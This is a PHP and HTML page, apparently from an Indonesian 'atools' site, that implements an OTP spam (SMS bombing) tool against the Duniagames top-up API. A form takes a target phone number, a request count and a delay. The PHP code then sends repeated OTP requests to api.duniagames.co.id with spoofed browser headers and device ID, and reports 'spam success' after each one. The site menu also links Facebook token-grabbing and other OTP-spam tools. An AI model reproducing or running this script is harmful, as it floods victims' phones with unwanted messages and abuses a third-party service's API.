<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css" integrity="sha256-2XFplPlrFClt0bIdPgpz8H7ojnk10H69xRqd9+uTShA=" crossorigin="anonymous" />

    <title>atools - spam otp duniagames</title>
  </head>
  <body id="page-top">
    <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-primary">
  <a class="navbar-brand" href="#"><i class="fas fa-code"></i> </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item">
        <a class="nav-link" href="../index.html">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item active dropdown">
        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
          Tools
        </a>
        <div class="dropdown-menu" aria-labelledby="navbarDropdown">
          <a class="dropdown-item" href="../get-token-fb">Get token facebook</a>
          <a class="dropdown-item" href="../profile-picture-guard">Profile picture guard</a>  
          <a class="dropdown-item" href="../instagram-downloader">Instagram downloader</a>
          <a class="dropdown-item" href="../spam-otp-phd">Spam otp phd</a>
          <a class="dropdown-item" href="index.php">Spam otp duniagames</a>
        </div>
      </li>
                  <li class="nav-item">
        <a class="nav-link" href="../contact">Contact</a>
      </li>
    </ul>
  </div>
</nav>
<h2 class="mb-4">page-top</h2>
<div class="container">
    <h3 class="text-center pt-4">amtzxx - spam otp duniagames</h3>
    <div class="row pt-4">
                  <div class="col-xl-3 col-md-6 mb-4">
                     <div class="card shadow mb-4">
                        <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                           <h6 class="m-0 font-weight-bold text-primary"><i class="fas fa-phone mr-2"></i> Spam otp duniagames</h6>
                        </div>
                        <div class="card-body">
                           <form action="index.php" method="POST">
                              <div class="row">
                                 <div class="col-md-6">
                                    <div class="form-group">
                                       <label for="nomor">Nomor :</label>
                                       <div class="input-group mb-3">
                                          <input type="number" class="form-control" id="nomor" name="nomor" placeholder="Nomor">
                                       </div>
<label for="delay">Delay :</label>
                                       <div class="input-group mb-3">
                                          <input type="number" class="form-control" id="delay" name="delay" placeholder="Delay">
                                       </div>
<label for="jumlah">Jumlah :</label>
                                       <div class="input-group mb-3">
                                          <input type="number" class="form-control" id="jumlah" name="jumlah" placeholder="Jumlah">
                                       </div>                                       
                                       <center>
                                          <button type="button" class="btn btn-outline-primary mt-2" onclick="submit();"><i class="far fa-paper-plane"></i> Submit</button>
                                       </center>
                           </form>
                           </div>
                           </div>
                           </div>
                        </div>
                     </div>
                     </div>               
                     </div>
</div>

            
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9.15.1/dist/sweetalert2.all.min.js"></script>
  </body>
</html>
<?php
function curl($url,$header,$post){
$ch= curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_REFERER, "https://duniagames.co.id/top-up/item/freefire");
$respon = curl_exec($ch);
curl_close($ch);
return $respon;
}

$no = $_POST['nomor'];
$jumlah = $_POST['jumlah'];
$delay = $_POST['delay'];
$x= 0;
while($x < $jumlah){
$ua=array();
$ua[]='Host: api.duniagames.co.id';
$ua[]='ciam-type: FR';
$ua[]='accept: application/json, text/plain, */*';
$ua[]='sec-fetch-dest: empty';
$ua[]='content-type: multipart/form-data; boundary=----WebKitFormBoundaryiFzVTg6uQkcUpA0T';
$ua[]='x-device: b594574e-a82b-4d07-9b0e-b88cc22070fb';
$ua[]='user-agent: Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36';


$data=  array();
$data[]='------WebKitFormBoundaryiFzVTg6uQkcUpA0T
Content-Disposition: form-data; name="phoneNumber"

'.$no.'
------WebKitFormBoundaryiFzVTg6uQkcUpA0T
Content-Disposition: form-data; name="inquiryId"

36832115
------WebKitFormBoundaryiFzVTg6uQkcUpA0T--
';

$login=curl("https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/",$ua,$data);
$hasil = json_decode($login);
echo "<center><font color='007AFF'> => spam success to $no <br></center>";
sleep($delay);
$x++;
flush();
}
?>
